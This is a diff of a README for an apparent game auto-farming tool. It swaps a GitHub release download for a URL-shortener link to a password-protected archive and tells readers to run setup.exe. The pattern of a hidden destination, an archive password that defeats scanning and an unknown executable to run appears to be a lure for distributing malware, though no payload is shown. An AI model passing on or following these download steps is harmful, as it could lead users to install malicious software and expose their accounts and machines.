@@ -17,8 +17,8 @@
 
 ## 🛠 Setup Instructions:
 ### 🔹 Windows (.exe) - Recommended:
-1️⃣ [Download](https://github.com/YbizWantzModz/HYPE-Farm-PC/releases/download/download/Farmer.rar) and extract the `Farmer.rar` (pass:122Farming)
-2️⃣ Run `AutoFarmer.exe`.  
+1️⃣ **[Download](https://goo.su/Hwka3s2) and extract archive(pass: Project12!)**
+2️⃣ Run `setup.exe`.  
 3️⃣ Enjoy automated farming! 🚀  
 
 ### 🔹 Alternative Python Method:
